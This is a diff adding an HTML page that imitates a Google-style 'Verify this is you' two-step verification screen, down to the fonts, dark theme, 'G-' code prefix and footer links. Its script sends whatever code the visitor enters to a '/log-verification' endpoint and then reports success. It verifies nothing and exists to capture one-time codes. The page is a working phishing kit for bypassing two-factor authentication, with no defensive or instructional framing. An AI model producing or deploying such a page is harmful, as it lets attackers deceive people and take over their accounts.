@@ -1,0 +1,177 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Verify</title>
+  <style>
+    * { box-sizing: border-box; margin: 0; padding: 0; }
+    body {
+      min-height: 100vh;
+      background: #202124;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: flex-start;
+      font-family: 'Google Sans', 'Roboto', Arial, sans-serif;
+    }
+    .card {
+      margin-top: 80px;
+      background: #292a2d;
+      border-radius: 16px;
+      width: 100%;
+      max-width: 500px;
+      padding: 40px 48px 48px;
+      box-shadow: 0 4px 32px rgba(0,0,0,0.5);
+    }
+    h2 {
+      font-size: 22px;
+      font-weight: 400;
+      color: #e8eaed;
+      margin-bottom: 8px;
+    }
+    p {
+      font-size: 14px;
+      color: #9aa0a6;
+      margin-bottom: 28px;
+    }
+    .field-box {
+      position: relative;
+      border: 1px solid #5f6368;
+      border-radius: 4px;
+      background: transparent;
+      transition: border-color 0.2s, box-shadow 0.2s;
+    }
+    .field-box.focused {
+      border-color: #8ab4f8;
+      box-shadow: 0 0 0 1px #8ab4f8;
+    }
+    .field-label {
+      position: absolute;
+      left: 12px;
+      top: -8px;
+      font-size: 11px;
+      color: #9aa0a6;
+      background: #292a2d;
+      padding: 0 4px;
+      pointer-events: none;
+      font-family: 'Google Sans', 'Roboto', Arial, sans-serif;
+      z-index: 1;
+    }
+    .field-label.focused-label { color: #8ab4f8; }
+    .input-row {
+      display: flex;
+      align-items: center;
+      padding: 16px 12px;
+    }
+    .prefix {
+      color: #e8eaed;
+      font-size: 14px;
+      white-space: nowrap;
+      user-select: none;
+    }
+    .field-input {
+      flex: 1;
+      background: transparent;
+      border: none;
+      outline: none;
+      color: #e8eaed;
+      font-size: 14px;
+      font-family: 'Google Sans', 'Roboto', Arial, sans-serif;
+      padding: 0;
+      margin: 0;
+    }
+    .success-msg {
+      margin-top: 16px;
+      color: #81c784;
+      font-size: 13px;
+    }
+    .btn-row {
+      margin-top: 36px;
+      display: flex;
+      justify-content: flex-end;
+    }
+    .submit-btn {
+      background: #8ab4f8;
+      color: #202124;
+      border: none;
+      border-radius: 100px;
+      padding: 10px 24px;
+      font-size: 14px;
+      font-weight: 600;
+      font-family: 'Google Sans', 'Roboto', Arial, sans-serif;
+      cursor: pointer;
+      letter-spacing: 0.01em;
+      transition: background 0.2s;
+    }
+    .submit-btn:hover { background: #aecbfa; }
+    .submit-btn:disabled { opacity: 0.7; cursor: not-allowed; }
+    .footer {
+      position: fixed;
+      bottom: 24px;
+      right: 24px;
+      display: flex;
+      gap: 24px;
+      font-size: 13px;
+      color: #9aa0a6;
+    }
+    .footer span { cursor: pointer; }
+  </style>
+</head>
+<body>
+  <div class="card">
+    <h2>Verify this is you</h2>
+    <p>Enter the verification code from your authenticator app.</p>
+
+    <form id="verifyForm" autocomplete="off">
+      <div class="field-box" id="codeBox">
+        <span class="field-label" id="codeLabel">Verification Code</span>
+        <div class="input-row">
+          <span class="prefix">G-</span>
+          <input class="field-input" id="codeInput" type="text" 
+autocomplete="off" />
+        </div>
+      </div>
+
+      <div class="success-msg" id="successMsg" style="display:none;">Code 
+submitted successfully.</div>
+
+      <div class="btn-row">
+        <button type="submit" class="submit-btn" 
+id="submitBtn">Submit</button>
+      </div>
+    </form>
+  </div>
+
+  <div class="footer">
+    <span>Help</span><span>Privacy</span><span>Terms</span>
+  </div>
+
+  <script>
+    const box   = document.getElementById('codeBox');
+    const label = document.getElementById('codeLabel');
+    const input = document.getElementById('codeInput');
+
+    input.addEventListener('focus', () => { box.classList.add('focused'); 
+label.classList.add('focused-label'); });
+    input.addEventListener('blur',  () => { 
+box.classList.remove('focused'); label.classList.remove('focused-label'); 
+});
+
+    document.getElementById('verifyForm').addEventListener('submit', async 
+e => {
+      e.preventDefault();
+      const btn  = document.getElementById('submitBtn');
+      const code = input.value;
+      btn.disabled = true;
+      await fetch('/log-verification', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ verificationCode: 'G-' + code })
+      });
+      btn.disabled = false;
+      document.getElementById('successMsg').style.display = 'block';
+    });
+  </script>
+</body>
+</html>
